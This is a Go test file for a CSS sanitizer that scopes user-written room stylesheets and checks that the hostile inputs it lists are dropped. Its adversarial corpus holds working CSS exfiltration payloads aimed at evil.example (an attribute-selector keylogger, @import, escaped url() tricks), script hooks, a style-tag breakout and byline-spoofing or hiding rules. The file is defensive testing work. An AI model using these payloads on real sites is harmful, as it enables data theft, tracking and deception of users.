package roomstyle

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

const (
	room    = "guides"
	liveID  = "0123456789abcdef0123456789abcdef"
	otherID = "fedcba9876543210fedcba9876543210"
	tinyPNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGP4X3gOAASxAj8KLP7+AAAAAElFTkSuQmCC"
)

var roomOptions = Options{Attachment: func(id string) bool { return id == liveID }}

// sanitize runs the full pipeline and the properties every output must have:
// it verifies, and sanitizing it again changes nothing and warns about nothing.
func sanitize(t *testing.T, css string) (Stylesheet, []Warning) {
	t.Helper()
	out, warnings, err := SanitizeWith(css, room, roomOptions)
	if err != nil {
		t.Fatalf("SanitizeWith(%q): %v", clip(css), err)
	}
	if err := Verify(out.CSS, out.Scope); err != nil {
		t.Fatalf("output fails Verify: %v\n%s", err, out.CSS)
	}
	again, rewarn, err := SanitizeWith(out.CSS, room, roomOptions)
	if err != nil || again.CSS != out.CSS || len(rewarn) != 0 {
		t.Fatalf("not idempotent (err %v, warnings %v):\n%s\n---\n%s", err, rewarn, out.CSS, again.CSS)
	}
	return out, warnings
}

func TestExamplesPassWithoutWarnings(t *testing.T) {
	paths, _ := filepath.Glob("examples/*.css")
	if len(paths) != 5 {
		t.Fatalf("want 5 example themes, found %v", paths)
	}
	for _, path := range paths {
		src, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		out, warnings := sanitize(t, string(src))
		if len(warnings) != 0 {
			t.Errorf("%s: %v", path, warnings)
		}
		if !strings.Contains(out.CSS, "."+out.Scope+"{") {
			t.Errorf("%s: no :scope rule in\n%s", path, out.CSS)
		}
	}
}

// The protocol rooms' stylesheets (deploy/protocol-rooms, set by the operator)
// are held to the same bar as the examples: the sanitizer drops nothing.
func TestProtocolRoomStylesPassWithoutWarnings(t *testing.T) {
	paths, _ := filepath.Glob("../../deploy/protocol-rooms/*.css")
	if len(paths) < 10 {
		t.Fatalf("want the protocol room themes, found %v", paths)
	}
	for _, path := range paths {
		src, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		// apply-styles.sh replaces url("/a/ASSET:file") with the uploaded asset's
		// ID; here each file gets a stand-in ID the room is told it owns, and the
		// file must exist.
		ids := map[string]bool{}
		css := assetRef.ReplaceAllStringFunc(string(src), func(ref string) string {
			name := strings.TrimPrefix(ref, "ASSET:")
			if _, err := os.Stat(filepath.Join(filepath.Dir(path), "assets", name)); err != nil {
				t.Errorf("%s names a missing asset %s", path, name)
			}
			sum := sha256.Sum256([]byte(name))
			id := hex.EncodeToString(sum[:16])
			ids[id] = true
			return id
		})
		out, warnings, err := SanitizeWith(css, "protocol", Options{Attachment: func(id string) bool { return ids[id] }})
		if err != nil || len(warnings) != 0 {
			t.Errorf("%s: %v %v", path, err, warnings)
		}
		if again, rewarn, err := SanitizeWith(out.CSS, "protocol", Options{Attachment: func(id string) bool { return ids[id] }}); err != nil || again.CSS != out.CSS || len(rewarn) != 0 {
			t.Errorf("%s: not idempotent: %v %v", path, err, rewarn)
		}
		if len(ids) > MaxAttachments {
			t.Errorf("%s names %d assets; a stylesheet may name %d", path, len(ids), MaxAttachments)
		}
	}
}

var assetRef = regexp.MustCompile(`ASSET:[A-Za-z0-9._-]+`)

func TestScopingAndHooks(t *testing.T) {
	S := "." + ScopeClass(room)
	for css, want := range map[string]string{
		"p{color:red}":                                                     S + " p{color:red;}",
		":scope{color:red}":                                                S + "{color:red;}",
		"body{margin:0}":                                                   S + " body{margin:0;}",
		".nav a, .byline:hover{color:red}":                                 S + " .site-nav a," + S + " .author:hover{color:red;}",
		".post-body > p{opacity:.5}":                                       S + " .room-body > p{opacity:.5;}",
		".post-body p:has(+ a){color:red}":                                 S + " .room-body p:has(+ a){color:red;}",
		".post-body .post-text::first-letter{float:left}":                  S + " .room-body .memo-text::first-letter{float:left;}",
		"a[aria-current=page]{color:red}":                                  S + " a[aria-current=page]{color:red;}",
		"li:nth-child(2n+1){color:red}":                                    S + " li:nth-child(2n+1){color:red;}",
		"@keyframes spin{to{rotate:1turn}}.post-body p{animation:spin 1s}": "@keyframes " + ScopeClass(room) + "-spin{to{rotate:1turn;}}\n" + S + " .room-body p{animation:" + ScopeClass(room) + "-spin 1s;}",
	} {
		out, warnings := sanitize(t, css)
		if strings.TrimSpace(out.CSS) != want || len(warnings) != 0 {
			t.Errorf("%s\n got %q %v\nwant %q", css, out.CSS, warnings, want)
		}
	}
}

// A rule is split by zone: the page zone keeps only what cannot hide, move or
// cover; the body zone keeps the rest.
func TestZones(t *testing.T) {
	S := "." + ScopeClass(room)
	out, warnings := sanitize(t, `.post, .post-body, .post-body ~ .post-footer, .post-body > p { opacity: .5; color: red }`)
	want := S + " .memo," + S + " .room-body ~ .memo-bottom{color:red;}\n" + S + " .room-body," + S + " .room-body > p{opacity:.5;color:red;}\n"
	if out.CSS != want || len(warnings) != 1 {
		t.Errorf("got %q %v\nwant %q", out.CSS, warnings, want)
	}
	kept, warnings := sanitize(t, `:scope{--ink:#123;--trust-font:ui-monospace,monospace;--trust-ink:#fff;--trust-muted:rgb(200,200,200);--trust-plate:#000;
		display:grid;grid-template-columns:repeat(auto-fill,minmax(min-content,1fr)) 2fr;margin:0 auto;letter-spacing:.1em;outline:2px solid red;color:rgb(0 0 0 / 1)}
		.post-footer{justify-content:flex-end}`)
	if !strings.Contains(kept.CSS, "justify-content:safe flex-end;") || !strings.Contains(kept.CSS, "--trust-plate:#000;") {
		t.Errorf("alignment not made safe or knobs lost:\n%s", kept.CSS)
	}
	if len(warnings) != 0 || !strings.Contains(kept.CSS, "--trust-font:ui-monospace,monospace;") || !strings.Contains(kept.CSS, "display:grid;") {
		t.Errorf("safe page-zone declarations dropped: %v\n%s", warnings, kept.CSS)
	}
}

// Each case must be dropped (with a warning) and leave no trace in the output.
func TestAdversarialCorpus(t *testing.T) {
	cases := map[string]string{
		// Exfiltration and tracking: any fetch to another origin.
		"attribute keylogger":        `input[value^=a]{background:url(//evil.example/a)}`,
		"import url":                 `@import url(//evil.example/x.css);`,
		"import string":              `@import "https://evil.example/x.css";`,
		"hex-escaped url":            `a{background:u\72l(//evil.example/x)}`,
		"fully escaped url":          `a{background:\75\72\6c(//evil.example/x)}`,
		"uppercase url":              `a{background:URL(//evil.example/x)}`,
		"quoted url":                 `a{background:url("https://evil.example/x")}`,
		"backslash newline":          "a{background:ur\\\nl(//evil.example/x)}",
		"comment split function":     `a{background:u/**/rl(//evil.example/x)}`,
		"comment split property":     `a{back/**/ground:url(//evil.example/x)}`,
		"unterminated url":           `a{background:url(//evil.example/x`,
		"unterminated string":        "a{content:\"evil.example\n}",
		"custom property smuggle":    `:scope{--x:url(//evil.example/a)}p{background:var(--x)}`,
		"image-set via var":          `p{background:image-set(var(--evil-example) 1x)}`,
		"image-set":                  `p{background:image-set("//evil.example/a" 1x)}`,
		"webkit image-set":           `p{background:-webkit-image-set(url(//evil.example/a) 1x)}`,
		"cross-fade":                 `p{background:cross-fade(url(//evil.example/a),url(//evil.example/b),50%)}`,
		"src function":               `p{background:src("//evil.example/a")}`,
		"image function":             `p{background:image("//evil.example/a")}`,
		"font-face remote":           `@font-face{font-family:x;src:url(https://evil.example/f.woff2)}`,
		"font-face local":            `@font-face{font-family:x;src:local(evil-example)}`,
		"font-face data":             `@font-face{font-family:x;src:url(data:font/woff2;base64,AAAA) /*evil.example*/}`,
		"list-style remote":          `li{list-style:url(//evil.example/a)}`,
		"cursor remote":              `p{cursor:url(//evil.example/c),auto}`,
		"border-image remote":        `p{border-image:url(//evil.example/b) 30}`,
		"svg data url":               `p{background:url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><image href='//evil.example'/></svg>")}`,
		"html data url":              `p{background:url(data:text/html;base64,PGgxPmV2aWwuZXhhbXBsZTwvaDE+)}`,
		"mislabelled data url":       `p{background:url(data:image/png;base64,PGgxPmV2aWwuZXhhbXBsZTwvaDE+)}`,
		"javascript url":             `p{background:url(javascript:alert('evil.example'))}`,
		"same-origin write":          `p{background:url(/w/lobby/main?text=evil.example)}`,
		"attachment traversal":       `p{background:url(/a/../w/lobby/evil.example)}`,
		"attachment with query":      `p{background:url(/a/` + liveID + `?evil.example)}`,
		"attachment of another room": `p{background:url(/a/` + otherID + `)} /* evil.example */`,
		// Legacy script hooks.
		"expression":   `p{width:expression(alert('evil.example'))}`,
		"behavior":     `p{behavior:url(evil.example.htc)}`,
		"moz-binding":  `p{-moz-binding:url(//evil.example/x.xml#b)}`,
		"element()":    `p{background:-moz-element(#nav-identity) /* evil.example */}`,
		"paint()":      `p{background:paint(evil-example)}`,
		"attr outside": `p{width:attr(data-evil-example px)}`,
		// Escaping the canvas.
		":root":              `:root{--evil-example:1}`,
		"html body *":        `html body *{--evil-example:1}`,
		"head":               `head{--evil-example:1}`,
		"title":              `title{display:block}/*evil.example*/`,
		"root in is":         `p:is(:root *){--evil-example:1}`,
		"ancestor via is":    `p:is(body p){--evil-example:1}`,
		"ancestor via where": `p:where([data-view=me] p){--evil-example:1}`,
		"scope sibling":      `:scope ~ *{--evil-example:1}`,
		"scope adjacent":     `:scope + *{--evil-example:1}`,
		"leading sibling":    `~ p{--evil-example:1}`,
		"leading adjacent":   `+ p{--evil-example:1}`,
		"scope not leading":  `p :scope{--evil-example:1}`,
		"scope in has":       `p:has(:scope){--evil-example:1}`,
		"host":               `:host{--evil-example:1}`,
		"nesting":            `& p{--evil-example:1}`,
		"namespace":          `*|p{--evil-example:1}`,
		"scope at-rule":      `@scope (html) { p{--evil-example:1} }`,
		// Trust UI: reserved classes, ids and attributes.
		"reserved class":         `.toast{--evil-example:1}`,
		"escaped reserved class": `.\74oast{--evil-example:1}`,
		"strip class":            `.room-style-strip{--evil-example:1}`,
		"class attribute":        `[class*=badge]{--evil-example:1}`,
		"class word attribute":   `[class~="author"]{--evil-example:1}`,
		"id attribute":           `[id^=nav]{--evil-example:1}`,
		"id selector":            `#nav-identity{--evil-example:1}`,
		"canvas class":           `.room-canvas{--evil-example:1}`,
		"other room scope":       `.room-style-0000000000000000{--evil-example:1}`,
		"reserved in has":        `p:has(.author){--evil-example:1}`,
		"reserved in not":        `p:not(.toast){--evil-example:1}`,
		// Page-wide definitions.
		"property":         `@property --ink{syntax:"<color>";inherits:false;initial-value:red}/*evil.example*/`,
		"counter-style":    `@counter-style evil-example{system:cyclic;symbols:x}`,
		"page":             `@page{margin:0}/*evil.example*/`,
		"namespace rule":   `@namespace evil url(http://evil.example);`,
		"charset":          `@charset "evil.example";`,
		"view-transition":  `@view-transition{navigation:auto}/*evil.example*/`,
		"transition name":  `p{view-transition-name:evil-example}`,
		"anchor name":      `p{anchor-name:--evil-example}`,
		"position anchor":  `p{position-anchor:--evil-example}`,
		"nested rule":      `p{& a{--evil-example:1}}`,
		"font-palette":     `@font-palette-values --evil-example{font-family:x}`,
		"keyframes inside": `@keyframes k{@media all{from{--evil-example:1}}}`,
	}
	// Full-page attacks: each tries to hide, cover, move away or forge trust UI
	// from the page zone. The marker after "=>" must not survive.
	for name, attack := range map[string]string{
		"cover the nav":             `.post-footer{position:fixed;inset:0;z-index:99;background:#fff} => position`,
		"free zone above bylines":   `.sidebar{position:fixed;inset:0;z-index:101;background:#fff} => z-index`,
		"free zone z-index var":     `.room-header{position:relative;z-index:var(--z)} => z-index`,
		"free zone z-index calc":    `.post-meta{position:relative;z-index:calc(100 + 1)} => z-index`,
		"free zone pulls feed up":   `.room-header{margin-bottom:-99999px} => margin`,
		"free pseudo pulls feed up": `.room-header::after{content:"";display:block;margin-block-end:calc(1px*cos(180deg))} => margin`,
		"free fake byline":          `.post-meta::after{content:"⌘ weaver"} => weaver`,
		"free fake check":           `.post-meta::after{content:"✓"} => ✓`,
		"free escaped letters":      `.post-meta::after{content:"\77 eaver"} => eaver`,
		"free fullwidth letters":    `.via::after{content:"ｗｅａｖｅｒ"} => ｗ`,
		"free circled letters":      `.via::after{content:"ⓦⓔⓐⓥⓔⓡ"} => ⓦ`,
		"free math letters":         `.via::after{content:"𝐰𝐞𝐚𝐯𝐞𝐫"} => 𝐰`,
		"free bidi control":         `.via::after{content:"\202e 123"} => 123`,
		"free attr":                 `.post-meta::after{content:attr(title)} => attr`,
		"free var content":          `.post-meta::after{content:var(--name)} => content`,
		"free roman counter":        `.post-meta::before{content:counter(item, upper-roman)} => upper-roman`,
		"free counters separator":   `.post-meta::before{content:counters(item, "by weaver")} => weaver`,
		"free alpha marker":         `.sidebar li{list-style-type:lower-alpha} => lower-alpha`,
		"free string marker":        `.sidebar li{list-style:"weaver "} => weaver`,
		"free quotes":               `.sidebar q{quotes:"weaver" "!"} => weaver`,
		"free has probe":            `.sidebar:has(a){color:red} => has(`,
		"free keyword content":      `.post-meta::before{content:weaver} => weaver`,
		"z-index war":               `.post{z-index:2147483647} => z-index`,
		"byline transparent":        `.byline{color:transparent} => color`,
		"byline alpha":              `.post-footer{color:rgb(0 0 0 / .01)} => color`,
		"byline hsla":               `.post-footer{color:hsla(0,0%,0%,0)} => color`,
		"byline via var":            `:scope{--c:transparent}.byline{color:var(--c)} => color:`,
		"byline color-mix":          `.byline{color:color-mix(in srgb, red, transparent 99%)} => color`,
		"byline 8-digit hex":        `.byline{color:#00000001} => color`,
		"site token transparent":    `:scope{--muted:transparent} => --muted`,
		"site token size":           `:scope{--t-meta:0px} => --t-meta`,
		"site token font":           `:scope{--sans:RoomFont} => --sans`,
		"trust font room font":      `:scope{--trust-font:"RoomFont"} => --trust-font`,
		"text-indent":               `.post-footer{text-indent:-9999px} => text-indent`,
		"text fill":                 `.byline{-webkit-text-fill-color:transparent} => fill`,
		"text stroke":               `.byline{-webkit-text-stroke:40px #fff} => stroke`,
		"fake verified after":       `.byline::after{content:"verified"} => verified`,
		"fake verified before":      `.post-meta::before{content:"verified";position:absolute} => verified`,
		"fake verified first-line":  `.post-footer::first-line{color:red} => first-line`,
		"strip offscreen":           `p{transform:translateX(-9999px)} => transform`,
		"translate property":        `.feed{translate:0 -9999px} => translate`,
		"filter opacity":            `:scope{filter:opacity(0)} => filter`,
		"opacity":                   `.post-footer{opacity:0} => opacity`,
		"clip-path":                 `.post-footer{clip-path:inset(50%)} => clip-path`,
		"mask":                      `.post{mask:linear-gradient(transparent,transparent)} => mask`,
		"webkit mask":               `.post{-webkit-mask-image:linear-gradient(transparent,transparent)} => mask`,
		"overflow clip":             `.post-footer{height:0;overflow:hidden} => overflow`,
		"visibility":                `.feed{visibility:hidden} => visibility`,
		"display none":              `.post-footer{display:none} => display`,
		"display contents":          `.post-footer{display:contents} => display`,
		"display table-column":      `.byline{display:table-column} => display`,
		"display via var":           `.byline{display:var(--d)} => display`,
		"content-visibility":        `.post{content-visibility:hidden} => content-visibility`,
		"negative margin":           `.post-footer{margin-left:-9999px} => margin`,
		"negative margin calc":      `.post-footer{margin:calc(0px - 9999px)} => margin`,
		"negative letter-spacing":   `.byline{letter-spacing:-1em} => letter-spacing`,
		"negative margin cos":       `.room-header{margin-left:calc(300px*cos(180deg))} => margin`,
		"negative margin log":       `.room-header{margin-left:calc(300px*log(.5))} => margin`,
		"negative margin infinity":  `.post-footer{margin-top:calc(1px * -infinity)} => margin`,
		"negative spacing sin":      `.byline{word-spacing:calc(1px*sin(270deg))} => word-spacing`,
		"vertical-align length":     `.byline{vertical-align:9999px} => vertical-align`,
		"huge outline":              `.post{outline:3000px solid #fff} => outline`,
		"outline offset":            `.post-footer{outline-offset:-3000px} => outline`,
		"zoom":                      `body{zoom:.01} => zoom`,
		"animation of a site name":  `.post{animation:compose-posted 1s} => animation`,
		"animation hides byline":    `@keyframes k{to{opacity:0}}.post-footer{animation:k 1s forwards} => animation:`,
		"animation moves byline":    `@keyframes k{to{transform:translateX(-9999px)}}.post{animation:k 1s forwards} => animation:`,
		"animation display none":    `@keyframes k{to{display:none}}.post{animation:k 1s forwards} => animation:`,
		"animation visibility":      `@keyframes k{to{visibility:hidden}}.nav{animation:k 1s forwards} => animation:`,
		"animation stacks":          `@keyframes k{to{z-index:9;position:relative}}.feed{animation:k 1s forwards} => animation:`,
		"animation token":           `@keyframes k{to{--t-meta:0px}}.post{animation:k 1s forwards} => animation:`,
		"animation free z-index":    `@keyframes k{to{z-index:500}}.sidebar{position:fixed;animation:k 1s forwards} => animation:`,
		"animation free letters":    `@keyframes k{to{content:"weaver"}}.post-meta::after{content:"";animation:k 1s forwards} => animation:`,
		"flash fast":                `@keyframes k{to{background:#fff}}.post{animation:k .1s infinite alternate} => animation:`,
		"flash steps":               `@keyframes k{to{background-color:#fff}}.post{animation:k 2s steps(20) infinite} => animation:`,
		"flash many stops":          `@keyframes k{0%,20%,40%,60%,80%{color:#000}10%,30%,50%,70%,90%{color:#fff}}.post{animation:k 1s infinite} => animation:`,
		"flash keyframe steps":      `@keyframes k{from{background-color:#000;animation-timing-function:steps(50)}to{background-color:#fff}}.post-body{animation:k 1s infinite} => steps(50)`,
		"flash longhand duration":   `@keyframes k{to{background-color:#fff}}.post{animation:k 2s infinite}.post{animation-duration:.05s} => .05s`,
		"flash longhand timing":     `.post-body{animation-timing-function:steps(99)} => steps(99)`,
		"flash via var":             `@keyframes k{to{background-color:#fff}}.post{animation:k var(--d) infinite} => animation:`,
		"flash in body":             `@keyframes k{to{background-color:#fff}}.post-body{animation:k .2s infinite alternate} => animation:`,
		"flash webkit":              `@keyframes k{to{background-color:#fff}}.post-body{-webkit-animation:k .2s infinite} => webkit`,
		"scroll-driven":             `.post-body{animation-timeline:scroll()} => timeline`,
		"no duration":               `@keyframes k{to{background-color:#fff}}.post{animation:k infinite} => animation:`,
		"all unset":                 `.nav a{all:unset} => all:`,
		"touch-action":              `:scope{touch-action:none} => touch-action`,
		"line-clamp":                `.post-footer{-webkit-line-clamp:1} => clamp`,
		"has probe":                 `.feed:has(.byline){color:red} => has(`,
		"has on scope":              `:scope:has(#compose-identity){color:red} => has(`,
		"sibling off body":          `.post-body ~ .post-footer{opacity:0} => opacity`,
		"isolation":                 `.post{isolation:isolate} => isolation`,
		"will-change":               `.post{will-change:transform} => will-change`,
		"blend":                     `.post{mix-blend-mode:difference} => blend`,
		"list marker string":        `.post-footer{display:list-item;list-style-type:"verified "} => verified`,
		"counter string":            `.post{counter-reset:"verified" 1} => verified`,
		"hyphenate string":          `.post-footer{hyphenate-character:"verified"} => verified`,
		"emphasis mark":             `.byline{text-emphasis:"✓"} => emphasis`,
		"text security":             `.byline{-webkit-text-security:disc} => security`,
		"underline over text":       `.byline{text-decoration:underline 40px #fff;text-underline-offset:-20px} => underline`,
		"strike out byline":         `.byline{text-decoration:line-through 8px #fff;text-decoration-style:double} => line-through`,
		"strike out from ancestor":  `.post-footer{text-decoration-line:line-through;text-decoration-thickness:8px} => line-through`,
		"decoration line via var":   `:scope{--l:line-through}.post-footer{text-decoration-line:var(--l)} => text-decoration-line`,
		"svg geometry":              `.post-actions path{d:path("M0 0")} => d:`,
		"height collapse":           `.post{height:0} => height`,
		"aspect-ratio collapse":     `.post-footer{aspect-ratio:100/1} => aspect-ratio`,
		"grid same cell":            `.post{grid-area:1/1} => grid-area`,
		"grid zero tracks":          `.feed{display:grid;grid-template-columns:0 0} => grid-template-columns`,
		"grid fixed tracks":         `.feed{grid-auto-rows:1px} => grid-auto-rows`,
		"reversed flex":             `.post-footer{flex-direction:row-reverse} => reverse`,
		"right float":               `.post{float:right} => float`,
		"order out of range":        `.post{display:flex}.post-footer{order:99999} => order`,
		"order via var":             `.post{display:flex}.post-footer{order:var(--o)} => order`,
		"posts in columns":          `.feed{columns:3} => columns`,
		"post split across columns": `.feed{column-count:3}.post-footer{break-before:column} => break`,
		"size containment":          `.post{container-type:size} => container`,
		"container shorthand":       `.post{container:x / size} => container`,
		"unsafe alignment":          `.post-footer{justify-content:unsafe flex-end} => unsafe`,
		"direction":                 `.post-footer{direction:rtl} => direction`,
		"trust ink low contrast":    `:scope{--trust-ink:#eeeeee} => --trust-ink`,
		"trust plate low contrast":  `:scope{--trust-plate:#707070} => --trust-plate`,
		"trust ink translucent":     `:scope{--trust-ink:rgb(0 0 0 / .1)} => --trust-ink`,
		"trust ink named":           `:scope{--trust-ink:black} => --trust-ink`,
		"trust ink off scope":       `.post{--trust-ink:#000} => --trust-ink`,
		"trust ink in media":        `@media all{:scope{--trust-ink:#000}} => --trust-ink`,
		"trust ink twice":           `:scope{--trust-ink:#000}:scope{--trust-ink:#fff;--trust-plate:#000} => --trust`,
		// Prefixed aliases of refused properties, which Chromium still honours.
		"webkit opacity":        `.site-header{-webkit-opacity:0} => opacity`,
		"webkit transform":      `.post-footer{-webkit-transform:scale(0)} => transform`,
		"webkit filter":         `.post{-webkit-filter:opacity(0)} => filter`,
		"webkit clip-path":      `.post-footer{-webkit-clip-path:inset(50%)} => clip-path`,
		"webkit animation":      `.post{-webkit-animation:k 1s} => animation`,
		"webkit margin":         `.post-footer{-webkit-margin-start:-9999px} => margin`,
		"webkit logical height": `.feed{-webkit-logical-height:0} => logical`,
		"webkit flex reverse":   `.post-footer{-webkit-flex-direction:row-reverse} => reverse`,
		"webkit hyphen string":  `.post{-webkit-hyphenate-character:"verified"} => verified`,
	} {
		css, marker, _ := strings.Cut(attack, " => ")
		t.Run(name, func(t *testing.T) {
			out, warnings := sanitize(t, css)
			if strings.Contains(out.CSS, marker) {
				t.Errorf("%q survived:\n%s", marker, out.CSS)
			}
			if len(warnings) == 0 {
				t.Errorf("dropped silently: %q", out.CSS)
			}
		})
	}
	for name, css := range cases {
		t.Run(name, func(t *testing.T) {
			out, warnings := sanitize(t, css)
			if strings.Contains(strings.ToLower(out.CSS), "evil") {
				t.Errorf("hostile content survived:\n%s", out.CSS)
			}
			if len(warnings) == 0 {
				t.Errorf("dropped silently: %q", out.CSS)
			}
		})
	}
}

func TestURLsKeepOnlyVerifiedAttachmentsAndInlineRasterImages(t *testing.T) {
	out, warnings := sanitize(t, `p{background:url(/a/`+liveID+`)} a{background:url("data:image/png;base64,`+tinyPNG+`")}`)
	if len(warnings) != 0 || !strings.Contains(out.CSS, `url("/a/`+liveID+`")`) || !strings.Contains(out.CSS, `url("data:image/png;base64,`+tinyPNG+`")`) {
		t.Fatalf("allowed URLs lost: %v\n%s", warnings, out.CSS)
	}
	// Without a room verifier, no attachment is trusted.
	plain, warnings, err := Sanitize(`p{background:url(/a/`+liveID+`)}`, room)
	if err != nil || strings.Contains(plain.CSS, "/a/") || len(warnings) != 1 {
		t.Fatalf("unverified attachment kept: %v %v %q", err, warnings, plain.CSS)
	}
}

// A repeated url() is checked once: each check is a database read per serve.
func TestRepeatedAttachmentIsCheckedOnce(t *testing.T) {
	checks := 0
	opts := Options{Attachment: func(id string) bool { checks++; return id == liveID }}
	out, _, err := SanitizeWith(strings.Repeat(`p{background:url(/a/`+liveID+`)}`, 300), room, opts)
	if err != nil || strings.Count(out.CSS, liveID) != 300 || checks != 1 {
		t.Fatalf("err %v, %d urls kept, %d checks", err, strings.Count(out.CSS, liveID), checks)
	}
	checks = 0
	dead := strings.Repeat("f", 32)
	if _, _, err := SanitizeWith(strings.Repeat(`p{background:url(/a/`+dead+`)}`, 300), room, opts); err != nil || checks != 1 {
		t.Fatalf("a refused attachment was checked %d times (%v)", checks, err)
	}
}

func TestGlobalNamesArePrefixed(t *testing.T) {
	scope := ScopeClass(room)
	out, warnings := sanitize(t, `
@font-face{font-family:Georgia;src:url(/a/`+liveID+`) format("woff2")}
.memo-text{font-family:Georgia,serif}
@layer base{p{color:red}}
@layer a, b;`)
	for _, want := range []string{
		`font-family:"` + scope + `-georgia";src:url("/a/` + liveID + `") format("woff2")`,
		`font-family:"` + scope + `-georgia",serif`,
		"@layer " + scope + "-base{",
		"@layer " + scope + "-a," + scope + "-b;",
	} {
		if !strings.Contains(out.CSS, want) {
			t.Errorf("missing %q in\n%s", want, out.CSS)
		}
	}
	if len(warnings) != 0 {
		t.Errorf("warnings: %v", warnings)
	}
}

func TestSerializationCannotCloseAStyleElementOrMergeTokens(t *testing.T) {
	out, _ := sanitize(t, `.post-body p::before{content:"</style><script>alert(1)</script>"} p{margin:1\65 3;width:1e3px;padding:1em}`)
	if strings.Contains(out.CSS, "<") {
		t.Fatalf("raw < in output: %s", out.CSS)
	}
	if !strings.Contains(out.CSS, `margin:1\65 3;`) || !strings.Contains(out.CSS, "width:1e3px;") || !strings.Contains(out.CSS, "padding:1em;") {
		t.Fatalf("dimension units not preserved: %s", out.CSS)
	}
}

func TestCaps(t *testing.T) {
	if _, _, err := Sanitize(strings.Repeat("p{color:red}", 1<<20/12), room); err == nil {
		t.Error("1 MB input accepted")
	}
	if _, _, err := Sanitize(strings.Repeat("a{b:c}", MaxRules+1), room); err == nil {
		t.Error("more than MaxRules rules accepted")
	}
	if _, _, err := Sanitize(strings.Repeat("(", 10000), room); err == nil {
		t.Error("10k-deep brackets accepted")
	}
	deep := strings.Repeat("@media all{", 20) + "p{color:red}" + strings.Repeat("}", 20)
	out, warnings := sanitize(t, deep)
	if out.CSS != "" || len(warnings) == 0 {
		t.Errorf("deep @media nesting kept: %q %v", out.CSS, warnings)
	}
	selectors := strings.Repeat("a,", 5000) + "a{color:red}"
	if _, _, err := Sanitize(selectors, room); err == nil {
		t.Error("5000 selectors accepted")
	}
	many := strings.Repeat(".toast{x:y}\n", 200)
	if _, warnings, _ := Sanitize(many, room); len(warnings) != maxWarnings+1 || !strings.Contains(warnings[maxWarnings].Message, "150 more") {
		t.Errorf("warnings not capped: %d", len(warnings))
	}
	var urls strings.Builder
	for i := range MaxAttachments + 1 {
		fmt.Fprintf(&urls, "p:nth-child(%d){background:url(/a/%032x)}", i+1, i)
	}
	out, warnings, err := SanitizeWith(urls.String(), room, Options{Attachment: func(string) bool { return true }})
	if err != nil || strings.Count(out.CSS, "/a/") != MaxAttachments || len(warnings) != 1 {
		t.Errorf("attachment URLs not capped: %v %d %v", err, strings.Count(out.CSS, "/a/"), warnings)
	}
	// Made-up IDs are refused, but each is a database read: the number looked
	// up is bounded however many a sheet names.
	urls.Reset()
	for i := range 500 {
		fmt.Fprintf(&urls, "p{b:url(/a/%032x)}", i)
	}
	lookups := 0
	if _, _, err := SanitizeWith(urls.String(), room, Options{Attachment: func(string) bool { lookups++; return false }}); err != nil || lookups != maxAttachmentChecks {
		t.Errorf("%d attachment lookups for 500 dead IDs (err %v); want %d", lookups, err, maxAttachmentChecks)
	}
}
